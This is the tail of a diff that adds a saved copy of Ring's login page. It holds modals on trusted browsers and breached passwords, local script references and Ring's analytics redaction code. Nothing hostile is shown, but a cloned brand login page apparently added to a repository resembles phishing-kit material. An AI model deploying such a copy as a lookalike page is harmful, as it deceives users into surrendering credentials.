+    <div class="modal-actions">
+      <button class="modal-accept">
+        Got it
+      </button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-backdrop remember-me hidden">
+  <div class="modal-container">
+    <div class="modal-heading">
+      <span class="heading">
+        Remember This Browser
+      </span>
+
+      <div class="modal-close">
+        <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/close-4698f0151c71214505f090589f26a384.svg" height="24" width="24" class="colorFilter-contentBase" alt="Close">
+      </div>
+    </div>
+
+    <div class="modal-body">
+      <div class="modal-icon">
+        <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/infodot-6c7a002efd192f04fa9f005ce9abbc88.svg" height="40" width="40" alt="Infodot">
+      </div>
+
+      <div class="modal-title">
+        Remember this browser for 30 days
+      </div>
+
+      <div class="modal-description">
+        By selecting, any logins from this browser will not require additional verification to access your account.
+      </div>
+
+      <div class="modal-description">
+        <div class="list">
+          <div class="list-title">
+            The following will reset the trusted browser:
+          </div>
+          <div class="list-bullets">
+            <div class="list-bullet">
+              <div class="list-icon">️<img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/check-d16259a8bde68a64b1269186dea73d9c.svg" alt="Check"></div>
+              <div class="list-text">Logins from different browsers</div>
+            </div>
+
+            <div class="list-bullet">
+              <div class="list-icon"><img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/check-d16259a8bde68a64b1269186dea73d9c.svg" alt="Check"></div>
+              <div class="list-text">Logins from the trusted browser in private/incognito mode</div>
+            </div>
+
+            <div class="list-bullet">
+              <div class="list-icon"><img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/check-d16259a8bde68a64b1269186dea73d9c.svg" alt="Check"></div>
+              <div class="list-text">Clearing cookies on the trusted browser</div>
+            </div>
+
+            <div class="list-bullet">
+              <div class="list-icon"><img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/check-d16259a8bde68a64b1269186dea73d9c.svg" alt="Check">️</div>
+              <div class="list-text">Logins from the same browser type on a different device</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal-actions">
+      <button class="modal-accept">
+        Got it
+      </button>
+    </div>
+  </div>
+</div>
+      </section>
+    </main>
+
+    <div class="action-banner-backdrop password-updated hidden _ar_hide_" _ar_hide_="width:0px;height:0px;margin:0px;position:fixed;display:none;">
+      <div class="action-banner-container">
+        <div class="action-banner-icon-container">
+          <div class="action-banner-icon">
+            <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/ring-logo-filled-blue-688503394f63193617bed6823b3cd84f.svg" height="56" width="56" alt="icons.ring-logo-filled-blue">
+          </div>
+
+          <div class="action-banner-close">
+            <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/close-4698f0151c71214505f090589f26a384.svg" height="24" width="24" class="colorFilter-contentBase" alt="Close">
+          </div>
+        </div>
+
+        <div class="action-banner-text">
+          <p class="action-banner-heading">
+            Success! Your password is updated. You can proceed to your Ring App or Ring.com.
+          </p>
+          <p class="action-banner-message">
+            You can sign in to your account using your new password on the Ring App  or Ring.com.
+          </p>
+        </div>
+
+        <div class="action-banner-actions">
+          <button class="action-banner-accept">
+            Open Ring App
+          </button>
+
+          <button class="action-banner-cancel">
+            Proceed to Ring.com
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal-backdrop breached-password hidden _ar_hide_" _ar_hide_="width:0px;height:0px;margin:0px;position:fixed;display:none;">
+      <div class="modal-container">
+        <div class="modal-heading">
+          <span class="heading">
+            Change Password
+          </span>
+
+          <div class="modal-close">
+            <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/close-4698f0151c71214505f090589f26a384.svg" height="24" width="24" class="colorFilter-contentBase" alt="Close">
+          </div>
+        </div>
+
+        <div class="modal-body">
+          <div class="modal-icon">
+            <img src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/error-f6b30e16610062ddd8dc56fb7df11a94.svg" height="40" width="40" alt="Error">
+          </div>
+
+          <div class="modal-title">
+            Your password was found to have been published online and is unsafe.
+          </div>
+
+          <div class="modal-description">
+            As a part of ongoing security checks, we detected that your 
+Ring password was also used for a non-Ring account that was exposed in a
+ data breach and published online. Ring’s systems and networks were not 
+compromised. However, to help prevent unauthorized access to your Ring 
+account, we are protecting you by logging you out of all devices and 
+disabling access to your Ring account until you change your password. We
+ will be sending you an email shortly with instructions on how to change
+ your password.
+          </div>
+        </div>
+
+        <div class="modal-actions">
+          <button class="modal-accept">
+            Change Password
+          </button>
+
+          <a class="modal-cancel" href="https://support.ring.com/hc/articles/360050453111" target="_blank" rel="noopener noreferrer">
+            Learn More
+          </a>
+        </div>
+      </div>
+    </div>
+
+    <script src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/en-us-f77bde05a1fe6570cdb6.js"></script>
+<script src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/en-gb-caed1c894794d6ebcc2e.js"></script>
+<script src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/de-1c36f9a70fe20c2fbe7c.js"></script>
+<script src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/es-80f908769275bb135f91.js"></script>
+<script src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/fr-86b86769d560d9053963.js"></script>
+<script src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/it-f19e8f9d5bc3b25083cd.js"></script>
+<script src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/ja-71571fa3113944e2866a.js"></script>
+<script src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/nl-2e3950de71cd6d5e0029.js"></script>
+
+<script>
+  window['translations'] = window.locales['en-us'];
+</script>
+
+    <script src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/async-polyfill-d8604ce973e218ebbf42.js"></script>
+    <script src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/heap-1d08724f737108a37fd6.js"></script>
+
+    
+
+    <script src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/dom-utils-0b734a0aca6d770f4a9e.js"></script>
+    <script src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/login-bc92d57622c09d2a2c01.js"></script>
+
+    
+
+    <template class="consent-heap append-to-head">
+  <script type="text/javascript">
+    function rewriteFunc(props) {
+      var pathRegex = new RegExp('(((account\/)(plan\/|app\/)(devices\/|payment\/|location\/|confirmation\/|plans\/(?:subscribe\/|upgrade\/|cancel\/|remove\/|)))|(cases\/|alerts\/|share\/|user\/viewprofilepage\/user-id\/|orders\/|checkouts\/))([A-Za-z0-9_@.-]+?)(?=\/|$)');
+        
+      var queryParamsRegex = new RegExp('([&?]deviceId=|[&?]locationId=|[&?]PayerID=|[&?]token=[&?]|l=|[&?]discount=|[&?]location=|[&?]devices=|[&?]checkout\[email\]=|[&?]invitation_token=|[&?]code=)([A-Za-z0-9_@.-]+?)(?=\/|$|\&)', 'g');
+    
+      var redactText = "$1" + "REDACTED";
+
+      // Paths  
+      // Example:    "/account/plan/devices/djn11j-1a61k-0/yearly"
+      // Obfuscated: "/account/plan/devices/REDACT_TEXT_GOES_HERE/yearly"
+
+      // Query Params 
+      // Example:    "/account/purchase/review?locationId=djn11j-1a61k-0&deviceId=31208385&planType=plus&billingFrequency=monthly"  
+      // Obfuscated: "/account/purchase/review?locationId=REDACT_TEXT_GOES_HERE&deviceId=REDACT_TEXT_GOES_HERE&planType=plus&billingFrequency=monthly"
+
+      // Hierarchy
+      // Example:    "@div;.Parent;|@div;.Child;|@a;[href=/account/purchase/review?locationId=djn11j-1a61k-0&deviceId=31208385&planType=plus&billingFrequency=monthly];|"
+      // Obfuscated: "@div;.Parent;|@div;.Child;|@a;[href=/account/purchase/review?locationId=REDACT_TEXT_GOES_HERE&deviceId=REDACT_TEXT_GOES_HERE&planType=plus&billingFrequency=monthly];|"
+
+      //Event Properties
+
+      if (props.event_properties) {
+          if (props.event_properties.href) {
+              props.event_properties.href = props.event_properties.href.replace(pathRegex, redactText);
+              props.event_properties.href = props.event_properties.href.replace(queryParamsRegex, redactText);
+          }
+          if (props.event_properties.hierarchy &&
+              props.event_properties.hierarchy.indexOf("[href") > -1) {
+              props.event_properties.hierarchy = props.event_properties.hierarchy.replace(pathRegex, redactText);
+              props.event_properties.hierarchy = props.event_properties.hierarchy.replace(queryParamsRegex, redactText);
+          }
+      }
+
+      // Pageview Properties
+
+      if (props.pageview_properties) {
+          if (props.pageview_properties.path) {
+              props.pageview_properties.path = props.pageview_properties.path.replace(pathRegex, redactText);
+          }
+          if (props.pageview_properties.hash) {
+              props.pageview_properties.hash = props.pageview_properties.hash.replace(pathRegex, redactText);
+          }
+          if (props.pageview_properties.previous_page) {
+              props.pageview_properties.previous_page = props.pageview_properties.previous_page.replace(pathRegex, redactText);
+          }
+          // Pageview Query Regex
+          if (props.pageview_properties && props.pageview_properties.query) {
+              props.pageview_properties.query = props.pageview_properties.query.replace(queryParamsRegex, redactText);
+          }
+      }
+
+      // Session Properties
+
+      if (props.session_properties) {
+          if (props.session_properties.path) {
+              props.session_properties.path = props.session_properties.path.replace(pathRegex, redactText);
+          }
+          if (props.session_properties.hash) {
+              props.session_properties.hash = props.session_properties.hash.replace(pathRegex, redactText);
+          }
+          if (props.session_properties.referrer) {
+              props.session_properties.referrer = props.session_properties.referrer.replace(pathRegex, redactText);
+          }
+          // Session Query Param Regex
+          if (props.session_properties.query) {
+              props.session_properties.query = props.session_properties.query.replace(queryParamsRegex, redactText);
+          }
+      }
+      return props;
+    }
+		
+    window.heapUtils.initRingSiteHeapJS({
+        accountId: '1155664863',
+        rewriteFn: rewriteFunc,
+    });
+  </script>
+</template>
+
+    
+    <script id="consent-script" src="Welcome%20Back!%20Please%20Log%20in%20_%20Ring_files/consent-manager.js" async=""></script>
+
+  
+
+<span class="consent-body"></span><div class="consent-banner"><span class="consent-banner-copy font__default size-small">This
+ site uses cookies for marketing and analytics pursuant to our Privacy 
+Notice. By continuing to browse this site, you agree to the placement of
+ such cookies.</span><div class="consent-banner-buttons"><button class="consent--manage btn--secondary btn--secondary">Manage Settings</button><button class="consent--accept btn--primary">Got it</button></div></div></body></html>
